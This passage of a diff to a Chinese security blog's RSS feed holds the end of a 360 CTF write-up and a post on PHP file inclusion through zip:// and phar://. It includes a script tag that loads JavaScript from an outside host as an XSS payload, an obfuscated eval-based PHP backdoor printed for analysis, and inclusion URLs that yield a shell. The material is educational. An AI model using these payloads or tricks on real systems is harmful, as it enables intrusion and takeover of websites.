+&lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+
+
+&lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setRequestHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;application/x-www-form-urlencoded&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+
+
+&lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setRequestHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-length&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+
+
+&lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setRequestHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Keep-Alive&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+
+
+ 
+
+
+
+&lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;然后提交&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://km2.in/360.js&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;登陆之后成功拿到flag&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2881738072.png&quot; alt=&quot;2881738072&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;re80&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;这个题目的pdf下载下来360直接报毒，然后打开空白，以前在一个ctf也遇到过。就是找到受影响的adobe reader的版本，然后打开就行了。然后这次就有经验了。先用kali下面的peepdf跑了一发，然后发现是一个cve&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3089303335.png&quot; alt=&quot;3089303335&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后谷歌cve编号，发现&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2801919870.png&quot; alt=&quot;2801919870&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;8.1.2下的版本都受影响。然后在虚拟机里下载了一个adobe reader，然后运行就是直接弹flag了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1238260674.png&quot; alt=&quot;1238260674&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;网络协议20&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;下载完数据包之后，然后过滤http请求&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1473484822.png&quot; alt=&quot;1473484822&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后丢到chrome的console解密&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-752797495.png&quot; alt=&quot;752797495&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3517484944.png&quot; alt=&quot;3517484944&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-741077206.png&quot; alt=&quot;741077206&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-4135195828.png&quot; alt=&quot;4135195828&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;加解密10&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN&lt;/p&gt;
+
+&lt;p&gt;这个题提示是个键盘有关系的，其实看看也能看出来BHU是连一起的 TGB也是连一起的&lt;/p&gt;
+
+&lt;p&gt;只是有一个分割的问题，一开始用,去分割就没有做出来，要用空格来分割，可以得到&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+BHUK,LP 
+
+BHUK,LP 
+
+TGBNHGYT 
+
+BHUK,LP 
+
+UYGBN 
+
+TGBNHGYT 
+
+BHUK,LP 
+
+BHUK,LP 
+
+TGBNHGYT 
+
+BHUK,LP 
+
+TGBNHGYT 
+
+UYGBN
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;一共有3类&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+BHUK,LP
+
+UYGBN
+
+TGBNHGYT
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;我们尝试在键盘上把他们画出来，记得,也要占一个键位的&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1076458764.jpg&quot; alt=&quot;1076458764&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+BHUK,LP   ：N
+
+UYGBN     ：C
+
+TGBNHGYT  : B
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;然后就是按照他的顺序输出flag了&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;NNBNCBNNBNBC&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;加解密20&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;给了一个shell文件，提示是后门的密码就是flag&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; 
+
+&lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;gzinflate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;pZLdSsNAEIXvBd+hTmOzMXTbFC3UGhtFEANWlLZES5OgvauoIFho2jy7s7PJhMSIF5Kbb2fPzs+Z7O8ZiYAmhLAFS9bQzhUQIboUPECKiUQDMSFMkYZIZt+U5nFkYijB0Kh0KfCcp+5wlh+6YaO2H9VFbW2BNK8U2iJJoiOk9Pek4q/ZBTwG481T4HeD3mC9vH79en67fb+fjScPM38aOMvL6erEn6xePm+uLj7u1i669I9qAucL4ZSDesQWC9WwHlGxkZRpwW9t1ikrDCRwAE87dtvm7EphlRQd3taC6AwpIjJ4A4XFkhcQ81uhbZcw6EN20a67mHPHxX8Qc+YQP7vyvxQJIHNBa9usUBMcck5d1kNqEVmZl9CDkmNNnsLIFV3IKnsVRT4OOCQJdRNq76Pzbw==&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;有这种解eval的特别方便的&lt;/p&gt;
+
+&lt;p&gt;http://zone.wooyun.org/content/19251&lt;/p&gt;
+
+&lt;p&gt;在kali下跑跑&lt;/p&gt;
+
+&lt;p&gt;php -d extension=evalhook.so shell.php&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1894415851.png&quot; alt=&quot;1894415851&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这个特殊的字符串就是flag了&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;p4n9_z1_zh3n9_j1u_Sh1_J13&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;加解密40&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-base64&quot;&gt;
+NTU2NJC3ODHHYWJIZ3P4ZWY=
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其实这是一个变异的base64.我们挨个把字母的大小写跑一遍，然后提取可见字符。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3223716866.png&quot; alt=&quot;3223716866&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后第二个flag就是正确的。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;系统20&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;shellsock的exp打一发&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-402964121.png&quot; alt=&quot;402964121&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Thu, 11 Jun 2015 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2015/06/11/%E7%AC%AC%E4%B8%89%E5%B1%8A-360%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-writeup.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2015/06/11/%E7%AC%AC%E4%B8%89%E5%B1%8A-360%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-writeup.html</guid>
+        
+        <category>writeup</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>zip或phar协议包含文件</title>
+        <description>&lt;p&gt;这个方法适用于验证包含文件为特定后缀时。
+例如以下代码&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strtolower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.jpg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.jpg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;上面的代码一个验证了后缀是否为jpg，一个是直接添加了jpg后缀，然后才包含。对于现在这种情况，要包含php文件的话的，可以通过截断。但是\x00的截断在php&amp;gt;5.3.4就没用了，而且还要考虑GPC,所以是比较鸡肋的方法。其实我们可以通过zip协议和phar协议来包含文件。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;zip://&lt;/strong&gt;
+首先我们新建一个zip文件，里面压缩着一个php脚本。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/Users/Tomato/Documents/blog_backup/usr/uploads/2015/06/2355213942.png&quot; alt=&quot;1.png&quot; /&gt;
+然后我们构造zip://php.zip#php.jpg&lt;/p&gt;
+
+&lt;p&gt;http://127.0.0.1/file.php?file=zip://php.zip%23php.jpg&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-819654707.png&quot; alt=&quot;819654707&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这样就成功shell了。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;phar://&lt;/strong&gt;
+首先我们要用phar类打包一个phar标准包&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PharData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/phartest2.zip'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'phartest2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Phar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ZIP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./php.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addFromString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'a.jpg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;会生成一个zip的压缩文件。然后我们构造&lt;/p&gt;
+
+&lt;p&gt;http://127.0.0.1/file.php?file=phar://php.zip/php.jpg&lt;/p&gt;
+
+&lt;p&gt;也可以直接shell&lt;/p&gt;
+
+&lt;p&gt;其中phar适用范围为php&amp;gt;5.3.0&lt;/p&gt;
+
+&lt;p&gt;以下的这种包含方式在这样的情况下是无效的。
+include(一个规定的路径+可控点)&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 10 Jun 2015 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html</guid>
+        
+        <category>tricks</category>
+        
+        <category>php</category>
         
         
       </item>
